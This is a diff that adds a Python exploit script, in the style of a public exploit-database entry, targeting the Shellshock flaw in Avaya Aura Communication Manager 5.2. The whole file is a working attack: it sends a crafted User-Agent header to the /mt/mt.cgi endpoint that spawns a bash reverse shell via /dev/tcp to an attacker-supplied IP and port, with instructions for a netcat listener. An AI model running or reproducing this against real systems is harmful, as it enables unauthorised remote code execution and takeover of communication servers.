@@ -1,0 +1,51 @@
+# Exploit Title: Avaya Aura Communication Manager 5.2 - Remote Code Execution
+# Exploit Author: Sarang Tumne a.k.a SarT
+# Date: 2020-02-14
+# Confirmed on release 5.2
+# Vendor: https://www.avaya.com/en/
+# Avaya's advisory:  
+# https://downloads.avaya.com/css/P8/documents/100183151
+# Exploit generates a reverse shell to a nc listener (Shellshock Exploit)
+
+###############################################
+
+#!/usr/bin/python
+
+import sys
+import requests
+ 
+if len(sys.argv) < 4:
+	print "\n[*] Avaya Aura Communication Manager (CM)- Shellshock Exploit"
+	print "[*] Usage: <Victim's IP> <Attacker's IP> <Reverse Shell Port>" 
+	print "[*] Example: shellshock.py 127.0.0.1 127.0.0.1 1337"
+	print "[*] Netcat Listener: nc -lvvnp <port>"
+	print "\n"
+	sys.exit()
+
+#Disables request warning for cert validation ignore.
+requests.packages.urllib3.disable_warnings() 
+CM = sys.argv[1]
+url = "https://" + CM + "/mt/mt.cgi"
+attacker_ip = sys.argv[2]
+rev_port = sys.argv[3]
+
+http_headers = {
+		
+		"User-Agent": '() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/bash -i >& /dev/tcp/'+attacker_ip+'/'+rev_port+' 0>&1'
+			
+		}
+
+def main():
+		if len(sys.argv) == 4:
+		  
+		  print "[+] Success, spawning a shell on your custom port :)..."
+		  requests.get(url, headers=http_headers, verify=False, timeout=5)
+		
+		else: 	
+		  print "[-] Something went wrong, quitting..."
+			
+		sys.exit()
+	
+
+if __name__ == "__main__":
+	main()
